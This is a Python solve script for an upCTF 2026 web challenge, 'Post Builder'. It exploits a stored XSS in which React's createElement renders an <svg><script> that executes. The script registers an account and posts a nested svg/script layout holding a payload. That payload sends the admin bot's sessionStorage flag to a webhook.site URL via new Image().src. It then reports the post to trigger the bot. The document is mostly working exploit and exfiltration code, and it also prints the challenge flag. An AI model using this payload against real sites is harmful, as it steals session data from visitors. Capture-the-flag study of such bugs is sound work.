#!/usr/bin/env python3
"""
Challenge: Post Builder — upCTF 2026
Category:  web (XSS)
Flag:      upCTF{r34ct_js_1s_still_j4v4scr1pt-cWBvwH4P696b549c}

XSS via React 19's createElement: <svg><script> executes JS in SVG namespace.
HTML <script> rendered via React.createElement does NOT execute, but SVG <script> does.
Bot stores flag in sessionStorage → exfil via Image().src to webhook.
"""

import requests, sys, time

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://46.225.117.62:30027"
WEBHOOK = "https://webhook.site/YOUR-UUID-HERE"

s = requests.Session()

# Register
s.post(f"{TARGET}/api/auth/register", json={
    "username": f"solver{int(time.time())}",
    "email": f"solver{int(time.time())}@x.com",
    "password": "password123"
})

# Create XSS post: <svg><script> executes in SVG namespace
payload = f"new Image().src='{WEBHOOK}?f='+sessionStorage.getItem('adminFlag')"
resp = s.post(f"{TARGET}/api/posts", json={
    "title": "Hello",
    "layout": [{
        "wrapper": "svg",
        "children": [{
            "wrapper": "script",
            "children": [payload]
        }]
    }]
})
post_id = resp.json()["id"]
print(f"[+] Post created: {TARGET}/post/{post_id}")

# Report to trigger bot visit
resp = s.post(f"{TARGET}/api/report", json={"postId": post_id})
print(f"[+] Reported: {resp.json()}")
print(f"[*] Check {WEBHOOK} for flag in ?f= parameter")
